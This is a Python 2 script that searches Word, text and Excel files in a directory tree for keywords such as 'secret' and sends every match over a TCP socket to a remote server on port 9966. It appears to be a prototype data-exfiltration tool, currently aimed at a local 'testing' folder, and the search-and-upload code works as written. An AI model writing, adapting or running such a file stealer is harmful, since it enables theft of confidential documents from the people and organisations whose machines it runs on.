# Balash.py


import socket
import os
import win32com.client
import xlrd
import inspect


class Client:
    gateway = ''
    host = ''
    port = 0
    fileLocation = ''
    name = ''

    def __init__(self, host, port, fileLocation, name):
        self.gateway = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # This allows the address/port to be reused immediately
        # instead of it being stuck, waiting for late packets to arrive.
        self.gateway.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.port = port
        self.host = host
        self.fileLocation = fileLocation
        self.name = name
        self.connect()

    # Connect to host
    def connect(self):
        self.gateway.connect((self.host, self.port))
        self.sendFileName()
        self.sendFile()

    # Send the File name to server
    def sendFileName(self):
        self.gateway.send(self.name)
        self.gateway.recv(2)
    
    # Send file data to server
    def sendFile(self):
        with open(self.fileLocation, "rb") as readByte:
            data = readByte.read()
            
        self.gateway.send(data)
        self.gateway.send("END!")
        self.gateway.recv(3)
        self.gateway.close()


# Create connection and Send the file to the server
def sendIt(path, name):
    global host, port
    s = Client(host, port, path, name)

# Make lower case
def lowercaser(stri):
    return stri.lower()

# Check if Word file (docx) is secret
def searchInWord(path):
    global secrets

    # Open word file and get text
    app = win32com.client.Dispatch('Word.Application')
    doc = app.Documents.Open(path)
    text = lowercaser(doc.Content.Text)
    app.Quit()

    for word in secrets:
        if word in text:
            return True
    return False


# Check if Text file is secret
def searchInTXT(path):
    global secrets

    with open(path, 'r') as textfile:
        text = lowercaser(textfile.read())

    for word in secrets:
        if word in text:
            return True
    return False


# Check if Excel file is secret
def searchInExcel(path):
    exl = xlrd.open_workbook(path)
    for sheetNum in range(0, exl.nsheets, 1):
        sheet = exl.sheet_by_index(sheetNum)
        if sheetIsSecret(sheet):
            return True
    return False

# Gets one sheet from excel and check if secret
def sheetIsSecret(sheet):
    global secrets
    
    for row in range(0, sheet.nrows, 1):
        for col in range(0, sheet.ncols, 1):
            for word in secrets:
                if word in sheet.cell_value(row, col):
                    return True
    return False

# Check if file is wanted
def wantedFile(path):
    ext = path.split(".")[-1]

    if ext == "doc" or ext == "docx":
        return searchInWord(path)
    elif ext == "txt":
        return searchInTXT(path)
    elif ext == "xls" or ext == "xlsx":
        return searchInExcel(path)
   

# Scan computer for secret files
def fileScanner():
    paths = os.path.dirname(os.path.abspath(inspect.getfile(inspect.currentframe()))) + "\\testing"
    
    # Recursively scan path
    for (path, dirs, files) in os.walk(paths):
        for file1 in files:
            fullFilePath = os.path.join(path, file1)            
            if wantedFile(fullFilePath):
                sendIt(fullFilePath, file1)

def Main():
    fileScanner()
    

host = raw_input("Please enter server's name: ")
port = 9966
secrets = ["secret"]

if __name__ == "__main__":
    Main()
    print "end"
                
